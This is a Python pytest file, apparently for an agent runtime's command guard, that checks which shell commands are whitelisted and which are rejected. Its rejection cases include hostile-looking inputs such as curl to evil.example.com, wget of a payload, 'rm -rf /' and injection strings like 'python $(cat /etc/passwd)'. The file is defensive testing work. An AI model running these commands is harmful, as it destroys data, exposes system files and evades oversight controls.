"""命令白名单 / denylist 单元测试（T5 验收项，无需 docker）。"""

import pytest

from arp_runtime.tools.guard import CommandRejected, validate_command


class TestWhitelist:
    @pytest.mark.parametrize("command", [
        "pnpm install --frozen-lockfile",
        "pnpm -C packages/cart vitest run",
        "npm test",
        "node script.js",
        "npx vitest run",
        "python -m pytest",
        "pytest tests/ -v",
        "uv run pytest",
        "pip list",
        "git status",
        "git diff HEAD",
        "git apply fix.patch",
        "ls -la src",
        "cat package.json",
    ])
    def test_allowed(self, command: str):
        validate_command(command)  # 不抛错即通过

    @pytest.mark.parametrize("command", [
        "bash -c 'echo hi'",
        "sh script.sh",
        "make build",
        "git push origin main",
        "git commit -m x",
        "chmod +x evil.sh",
    ])
    def test_not_in_whitelist(self, command: str):
        with pytest.raises(CommandRejected, match="不在白名单"):
            validate_command(command)


class TestDenylist:
    @pytest.mark.parametrize("command", [
        "curl https://evil.example.com",
        "wget http://x/payload",
        "ssh user@host",
        "sudo rm file",
        "docker run alpine",
        "rm -rf /",
    ])
    def test_denied(self, command: str):
        with pytest.raises(CommandRejected, match="denylist"):
            validate_command(command)

    @pytest.mark.parametrize("command", [
        "git diff; curl evil.com",   # denylist 优先于注入检查
        "pnpm test && sudo reboot",
    ])
    def test_denylist_wins_even_with_valid_prefix(self, command: str):
        with pytest.raises(CommandRejected):
            validate_command(command)


class TestShellInjection:
    @pytest.mark.parametrize("command", [
        "pnpm test; echo pwned",
        "git status && ls /",
        "node -e `whoami`",
        "python $(cat /etc/passwd)",
        "pnpm run build || true",
    ])
    def test_injection_rejected(self, command: str):
        with pytest.raises(CommandRejected):
            validate_command(command)
